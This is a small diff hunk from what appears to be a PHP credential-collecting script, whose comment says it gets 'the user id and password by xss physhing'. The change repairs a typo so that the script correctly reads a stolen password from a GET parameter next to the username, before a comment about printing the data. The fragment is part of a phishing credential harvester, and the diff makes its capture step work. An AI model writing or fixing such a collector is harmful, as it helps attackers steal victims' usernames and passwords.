@@ -50,7 +50,7 @@
 				# get the user id and password by xss physhing
 				
 	$name =$_GET["name"];
-	&pass=$_GET["pass"];			
+	$pass=$_GET["pass"];			
 
 
   # Print the data
